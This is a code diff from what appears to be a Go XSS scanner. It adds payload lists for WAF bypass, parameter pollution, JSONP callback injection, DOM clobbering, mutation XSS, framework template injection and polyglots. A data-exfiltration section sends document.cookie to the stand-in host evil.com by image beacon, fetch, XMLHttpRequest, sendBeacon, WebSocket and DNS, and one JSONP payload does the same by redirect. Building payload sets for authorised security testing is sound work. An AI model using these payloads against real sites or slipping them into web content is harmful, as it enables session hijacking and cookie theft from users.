@@ -178,10 +178,24 @@ func categorizeTag(p string) string {
 		return "svg"
 	case strings.Contains(lower, "onload") || strings.Contains(lower, "onerror") ||
 		strings.Contains(lower, "onfocus") || strings.Contains(lower, "onclick") ||
-		strings.Contains(lower, "onmouseover") || strings.Contains(lower, "ontoggle"):
+		strings.Contains(lower, "onmouseover") || strings.Contains(lower, "ontoggle") ||
+		strings.Contains(lower, "onbegin"):
 		return "event"
 	case strings.Contains(lower, "javascript:"):
 		return "js-protocol"
+	case strings.Contains(lower, "callback=") || strings.Contains(lower, "jsonp=") || strings.Contains(lower, "cb="):
+		return "jsonp"
+	case strings.Contains(lower, "fetch(") || strings.Contains(lower, "xmlhttprequest") ||
+		strings.Contains(lower, "sendbeacon") || strings.Contains(lower, "websocket"):
+		return "exfil"
+	case strings.Contains(lower, "form id=") || strings.Contains(lower, "name=alert"):
+		return "dom-clobbering"
+	case strings.Contains(lower, "noscript") || strings.Contains(lower, "foreignobject") ||
+		strings.Contains(lower, "mtext"):
+		return "mxss"
+	case strings.Contains(lower, "dangerouslysetinnerhtml") || strings.Contains(lower, "v-html") ||
+		strings.Contains(lower, "innerhtml]") || strings.Contains(lower, "@html"):
+		return "framework"
 	case strings.Contains(lower, "alert") || strings.Contains(lower, "confirm") || strings.Contains(lower, "prompt"):
 		return "basic"
 	default:
@@ -324,6 +338,155 @@ func GetWafBypassPayloads() []Payload {
 
 	for _, p := range generic {
 		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "waf-bypass", WAF: "generic"})
+	}
+
+	// === HTTP Parameter Pollution (HPP) ===
+	hpp := []string{
+		// Duplicate parameter injection
+		`?q=legit&q=<script>alert(1)</script>`,
+		`?q=<script>alert(1)&q=</script>`,
+		`?q=<img/src=x/onerror=alert(1)>&q=safe`,
+		// Separator injection
+		`?q=legit%26q=<script>alert(1)</script>`,  // & in value
+		`?q=legit%3Bq=<script>alert(1)</script>`,  // ; in value
+		// Fragment-based
+		`?q=test#<script>alert(1)</script>`,
+		// Array-style parameter
+		`?q[]=legit&q[]=<script>alert(1)</script>`,
+		`?q[0]=safe&q[1]=<script>alert(1)</script>`,
+	}
+
+	for _, p := range hpp {
+		payloads = append(payloads, Payload{Value: p, Context: ContextURL, Tag: "hpp", WAF: "generic"})
+	}
+
+	// === JSONP / Callback Injection ===
+	jsonp := []string{
+		`callback=alert(1)//`,
+		`callback=<script>alert(1)</script>`,
+		`cb=alert(document.cookie)`,
+		`jsonp=alert(1)`,
+		`callback=alert&_=1`,
+		`cb=function(){alert(1)}()`,
+		`callback=document.location='http://evil.com/?c='+document.cookie`,
+		`%61%6c%65%72%74(1)`,  // encoded callback name
+		`callback=window["al"+"ert"](1)`,
+	}
+
+	for _, p := range jsonp {
+		payloads = append(payloads, Payload{Value: p, Context: ContextURL, Tag: "jsonp", WAF: "generic"})
+	}
+
+	// === DOM Clobbering ===
+	domClobbering := []string{
+		// Overwrite form elements
+		`<form id=x><output name=y>alert(1)</output></form><input formaction=x(0)>`,
+		// Overwrite document properties
+		`<form id=document><input name=cookie></form>`,
+		// Named access
+		`<a id=alert href=1>click</a>`,
+		`<img name=alert><img name=alert>`,
+		// Window property overwrite
+		`<div id=globalName>controlled</div>`,
+		// Double ID for collection
+		`<div id=x><div id=x name=y>controlled</div></div>`,
+		// anchor protocol
+		`<a id=x href="javascript:alert(1)">click</a>`,
+		// iframe srcdoc
+		`<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
+	}
+
+	for _, p := range domClobbering {
+		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "dom-clobbering", WAF: ""})
+	}
+
+	// === Mutation XSS (mXSS) ===
+	mxss := []string{
+		// noscript mutation
+		`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
+		// textarea mutation
+		`<textarea><script>alert(1)</script></textarea>`,
+		// title mutation
+		`<title><img src=x onerror=alert(1)></title>`,
+		// iframe srcdoc mutation
+		`<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>`,
+		// style mutation
+		`<style><img src=x onerror=alert(1)></style>`,
+		// SVG foreignObject
+		`<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>`,
+		// math mtext
+		`<math><mtext><table><mglyph><svg><mtext><path id="</mtext><img onerror=alert(1) src=x>">`,
+		// template + slot
+		`<template><slot><img src=x onerror=alert(1)></slot></template>`,
+		// form + button
+		`<form><math><mtext><form><mglyph><style></math><img src=x onerror=alert(1)>`,
+	}
+
+	for _, p := range mxss {
+		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "mxss", WAF: ""})
+	}
+
+	// === Framework-Specific ===
+	framework := []string{
+		// React - dangerouslySetInnerHTML
+		`<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}></div>`,
+		// React - JSX injection
+		`{React.createElement('img', {src:'x', onError:()=>alert(1)})}`,
+		// Vue - v-html directive
+		`<div v-html="'<img src=x onerror=alert(1)>'"></div>`,
+		// Vue - template expression
+		`{{constructor.constructor('alert(1)')()}}`,
+		// Angular - innerHTML binding
+		`<div [innerHTML]="'<img src=x onerror=alert(1)>'"></div>`,
+		// Angular - template injection
+		`{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}`,
+		// AngularJS (1.x) - sandbox escape
+		`{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}`,
+		// Svelte - {@html}
+		`{@html '<img src=x onerror=alert(1)>'}`,
+	}
+
+	for _, p := range framework {
+		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "framework", WAF: ""})
+	}
+
+	// === Data Exfiltration ===
+	exfil := []string{
+		// Image beacon
+		`<img src="http://evil.com/?c='+document.cookie+'">`,
+		// Fetch
+		`<script>fetch('http://evil.com/?c='+document.cookie)</script>`,
+		// XMLHttpRequest
+		`<script>var x=new XMLHttpRequest();x.open('GET','http://evil.com/?c='+document.cookie);x.send()</script>`,
+		// Navigator.sendBeacon
+		`<script>navigator.sendBeacon('http://evil.com',document.cookie)</script>`,
+		// WebSocket
+		`<script>var ws=new WebSocket('ws://evil.com');ws.onopen=function(){ws.send(document.cookie)}</script>`,
+		// DNS exfiltration
+		`<script>new Image().src='http://'+document.cookie+'.evil.com'</script>`,
+	}
+
+	for _, p := range exfil {
+		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "exfil", WAF: ""})
+	}
+
+	// === Polyglot Payloads ===
+	polyglot := []string{
+		// Attribute breaker
+		`'-alert(1)-'`,
+		`"-alert(1)-"`,
+		`';alert(1)//`,
+		`";alert(1)//`,
+		`</script><script>alert(1)</script>`,
+		// HTML/JS/Attr crossover
+		`"><img src=x onerror=alert(1)//`,
+		`'-alert(1)-'`,
+		// Universal
+		`javascript:/*--></title></style></textarea></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`,
+	}
+
+	for _, p := range polyglot {
+		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "polyglot", WAF: "generic"})
 	}
 
 	return payloads
